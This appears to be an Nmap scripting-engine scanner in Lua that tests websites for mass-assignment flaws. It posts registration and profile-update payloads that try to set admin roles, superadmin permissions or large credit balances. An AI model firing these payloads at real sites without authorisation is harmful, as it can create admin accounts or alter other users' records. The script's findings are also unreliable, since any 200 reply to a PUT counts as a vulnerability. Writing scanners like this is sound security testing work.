-- Mass Assignment Detection
-- Checks for mass assignment vulnerabilities
-- @output
-- 80/tcp open  http
-- | http-mass-assignment:
-- |   WARNING: Mass assignment vulnerability detected
-- |     Extra parameters accepted in user registration
-- |_    Role escalation via admin=true

description = [[
Detects mass assignment (over-posting) vulnerabilities.
Tests if web applications accept and process additional model attributes
that should not be user-controllable.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "http"}

portrule = function(host, port)
    return port.service == "http" or port.service == "https" or
           port.number == 80 or port.number == 443 or port.number == 8080
end

action = function(host, port)
    local http = require "http"
    local vulns = {}

    local registration_paths = {
        "/register", "/signup", "/api/users", "/api/register",
        "/user/create", "/account/create", "/api/v1/users"
    }

    local mass_payloads = {
        {data = "username=testuser&password=Test123!&role=admin", check = "role"},
        {data = "username=testuser&password=Test123!&isAdmin=true", check = "admin"},
        {data = "username=testuser&password=Test123!&is_admin=1", check = "admin"},
        {data = "username=testuser&password=Test123!&permissions=superadmin", check = "permission"},
        {data = '{"username":"testuser","password":"Test123!","role":"admin","isAdmin":true}', check = "admin", json = true},
        {data = '{"username":"testuser","password":"Test123!","credit":999999}', check = "credit", json = true},
    }

    for _, path in ipairs(registration_paths) do
        local get_response = http.get(host, port, path)
        if get_response and get_response.status then
            if get_response.status == 200 or get_response.status == 302 then
                if get_response.body then
                    if get_response.body:find("register") or
                       get_response.body:find("signup") or
                       get_response.body:find("create") then
                        table.insert(vulns, "Registration endpoint found: " .. path)
                    end
                end
            end
        end

        for _, payload in ipairs(mass_payloads) do
            local options = {}
            if payload.json then
                options = {header = {["Content-Type"] = "application/json"}}
            else
                options = {header = {["Content-Type"] = "application/x-www-form-urlencoded"}}
            end

            local response = http.post(host, port, path, options, nil, payload.data)
            if response and response.status then
                if response.status == 200 or response.status == 201 then
                    if response.body then
                        if response.body:find(payload.check) and
                           not response.body:find("error") and
                           not response.body:find("invalid") then
                            table.insert(vulns, "Mass assignment accepted on " .. path .. " (" .. payload.check .. ")")
                        end
                    end
                end
            end
        end
    end

    local update_paths = {
        "/api/users/1", "/api/profile", "/api/account",
        "/user/update", "/profile/update"
    }

    for _, path in ipairs(update_paths) do
        local json_payload = '{"name":"test","role":"admin","isAdmin":true}'
        local options = {header = {["Content-Type"] = "application/json"}}
        local response = http.put(host, port, path, options, nil, json_payload)
        if response and response.status then
            if response.status == 200 or response.status == 201 then
                table.insert(vulns, "Mass assignment via PUT on " .. path)
            end
        end
    end

    if #vulns > 0 then
        local result = "WARNING: Mass assignment vulnerability indicators\n"
        for _, v in ipairs(vulns) do
            result = result .. "  " .. v .. "\n"
        end
        return result
    end

    return "No mass assignment vulnerabilities detected"
end
